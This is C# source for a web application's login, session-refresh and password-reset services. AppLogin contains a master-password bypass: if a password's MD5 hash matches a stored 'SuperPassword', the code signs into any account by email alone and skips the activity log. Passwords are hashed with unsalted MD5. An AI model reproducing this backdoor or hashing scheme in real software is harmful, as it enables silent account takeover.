
namespace BaseApp.DAL
{
    using System;
    using System.Collections.Generic;
    using System.Data;
    using System.Linq;
    using BaseApp.Common;
    using BaseApp.DAL;

    internal partial class Repo
    {
        public DTO.Account_Select Account_SelectBy_Credential(string email, string password, int? cid)
        {
            var query = "app.Account_SelectBy_Credential";
            var parameters = new Service.KVList()
                .Add("@email", crypto.Encrypt(email))
                .Add("@password", password)
                .Add("@cid", cid);
            return queryEntity<DTO.Account_Select>(query, parameters).Decrypt(crypto);
        }

        public DTO.Account_Select Account_SelectBy_Email(string email, int? cid)
        {
            var query = "app.Account_SelectBy_Email";
            var parameters = new Service.KVList()
                .Add("@email", crypto.Encrypt(email))
                .Add("@cid", cid);
            return queryEntity<DTO.Account_Select>(query, parameters).Decrypt(crypto);
        }

        public DTO.Account_Select Account_SelectBy_ResetGuid(string guid)
        {
            var query = "app.Account_SelectBy_ResetGUID";
            return queryEntity<DTO.Account_Select>(query, "@guid", guid).Decrypt(crypto);
        }

        public void Account_Update_LastActivity(int id, DateTime lastActivity)
        {
            queryNonQuery("app.Account_Update_LastActivity", Service.KVList.Build()
                .Add("@uid", id)
                .Add("@lastActivity", lastActivity));
        }

        public void Account_SetPassword(string email, string password)
        {
            queryNonQuery("app.Account_SetPassword", Service.KVList.Build()
                .Add("@email", crypto.Encrypt(email))
                .Add("@password", password));
        }

        public void Account_ResetPassword(string email, Guid guid, DateTime expiry, bool forcedReset = false, bool unArchive = false)
        {
            var query = "app.Account_ResetPassword";
            var parameters = new Service.KVList()
                .Add("@email", crypto.Encrypt(email))
                .Add("@guid", guid)
                .Add("@expiry", expiry)
                .Add("@isAdminReset", forcedReset)
                .Add("@unArchive", unArchive);
            queryNonQuery(query, parameters);
        }

        public List<int> Account_GetPermissionList(int id)
        {
            var query = "app.Account_GetPermissionList";
            return queryList<int>(query, "@uid", id);
        }
    }
}

namespace BaseApp.DTO
{
    using System;
    using System.Collections.Generic;

    public class UserCaps
    {
        public string email { get; set; }
        public string name { get; set; }
        public int role { get; set; }
        public List<int> permissions { get; set; }
        public int uid { get; set; }
        public int cid { get; set; }
    }
}

namespace BaseApp.Service
{
    using System;
    using System.Collections.Generic;
    using System.Linq;
    using System.Threading;
    using BaseApp.Common;
    using BaseApp.DTO;
    using BaseApp.Mapper;

    public partial interface IAppService
    {
        UserCaps AppLogin(string email, string password, int cid);
        UserCaps RefreshAppLogin();
        string Get_EmailOfInvitation(string guid);
        string Get_EmailOfReset(string guid);
        void Save_Password(string email, string password);
        void Reset_Password(string email, string url);
    }

    public partial class AppService
    {
        public UserCaps AppLogin(string email, string password, int cid)
        {
            email = sanitizeEmail(email);
            password = password.Trim();

            if (string.IsNullOrEmpty(email))
                throw new ValidationException("Missing Email");

            if (string.IsNullOrEmpty(password))
                throw new ValidationException("Missing Password");

            Account_Select account;
            var passwordHash = Security.GetMD5Hash(password);

            var usingPasswordBypass = (passwordHash == SuperPassword);
            if (usingPasswordBypass)
                account = repo.Account_SelectBy_Email(email, cid);
            else
                account = repo.Account_SelectBy_Credential(email, passwordHash, cid);

            if (account == null)
                throw new ValidationException("Login Failed");

            if (account.archive)
                throw new ValidationException("Sign in refused. This account is archived.");

            if (!account.isSupport && account.cid != cid)
                throw new ValidationException("Login Failed in Company.");

            if (!usingPasswordBypass)
                repo.Account_Update_LastActivity(account.id, DateTime.Now);

            return populateUserCaps(account, cid);
        }

        public UserCaps RefreshAppLogin()
        {
            var uid = user.Get_UID();
            var cid = user.Get_CID();

            var account = repo.spAccount_Select(uid);
            if (account == null)
                throw new ValidationException("Login Failed");

            if (account.archive)
                throw new ValidationException("Sign in refused. This account is archived.");

            return populateUserCaps(account, cid);
        }

        public string Get_EmailOfInvitation(string guid)
        {
            var account = repo.Account_SelectBy_ResetGuid(guid);
            if (account == null)
                throw new ValidationException("This invitation is invalid");

            if (DateTime.Now > account.resetExpiry)
                throw new ValidationException("This invitation is expired");

            return account.email;
        }

        public string Get_EmailOfReset(string guid)
        {
            var account = repo.Account_SelectBy_ResetGuid(guid);
            if (account == null)
                throw new ValidationException("Invalid account");

            if (DateTime.Now > account.resetExpiry)
                throw new ValidationException("Expired email reset");

            return account.email;
        }

        public void Save_Password(string email, string password)
        {
            email = sanitizeEmail(email);
            password = password.Trim();

            var passwordHash = Security.GetMD5Hash(password);
            repo.Account_SetPassword(email, passwordHash);
        }

        public void Reset_Password(string email, string url)
        {
            email = sanitizeEmail(email);

            var guid = Guid.NewGuid();
            var expiry = DateTime.Now.AddDays(7);
            repo.Account_ResetPassword(email, guid, expiry);

            url = url.Replace("{guid}", guid.ToString());

            var emailFields = EmailFields.Build_ResetPasswordBy_Self(url);
            SendEmail(email, emailFields.subject, emailFields.bodyText);
        }


        UserCaps populateUserCaps(Account_Select account, int cid)
        {
            var permissions = repo.Account_GetPermissionList(account.id);

            return new UserCaps
            {
                email = account.email,
                name = $"{account.firstName} {account.lastName}",
                role = account.roleMask,
                permissions = permissions,
                uid = account.id,
                cid = cid
            };
        }
    }
}
